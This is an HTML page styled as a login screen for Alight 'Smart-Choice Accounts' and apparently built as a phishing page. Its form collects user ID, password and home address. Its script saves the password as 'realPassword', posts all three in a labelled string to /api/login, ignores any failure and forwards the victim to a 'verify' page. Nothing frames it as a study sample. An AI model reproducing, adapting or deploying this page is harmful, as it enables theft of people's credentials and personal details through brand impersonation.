<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .logo-container { text-align: center; margin: 40px 0 30px; }
        .logo-container h1 { font-size: 2.2rem; font-weight: 700; color: #1e2937; }
        .logo-container .subtitle { font-size: 1.8rem; color: #0f172a; margin-top: 5px; }
        .sun-icon { font-size: 3.5rem; margin: 15px 0; }
        .form-container { width: 100%; max-width: 380px; }
        label { display: block; margin: 25px 0 8px; font-size: 1.05rem; color: #334155; font-weight: 500; }
        input { width: 100%; padding: 14px 16px; border: none; border-bottom: 1.5px solid #cbd5e1; font-size: 1.1rem; background: transparent; }
        input:focus { outline: none; border-bottom-color: #3b82f6; }
        .login-btn { width: 100%; padding: 16px; background: #1e40af; color: white; border: none; border-radius: 50px; font-size: 1.2rem; font-weight: 600; margin: 15px 0; cursor: pointer; }
    </style>
</head>
<body>
    <div class="logo-container">
        <h1>alight</h1>
        <div class="subtitle">Smart-Choice Accounts®</div>
        <div class="sun-icon">☀️</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
            <label>Enter your User ID</label>
            <input type="text" id="username" placeholder="User ID" required>

            <label>Enter your Password</label>
            <input type="password" id="password" placeholder="Password" required>

            <label>Home Address (Current)</label>
            <input type="text" id="address" placeholder="Enter your current home address" required>

            <button type="submit" class="login-btn">LOG IN</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const homeAddress = document.getElementById('address').value.trim();

            sessionStorage.setItem('realPassword', password);

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username, 
                        password, 
                        address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
                    })
                });
            } catch (err) {}

            window.location.href = "verify.html";
        });
        
    </script>
    <script src="app.js"></script>
    <script type="module" src="speed-insights.js"></script>
</body>
</html>
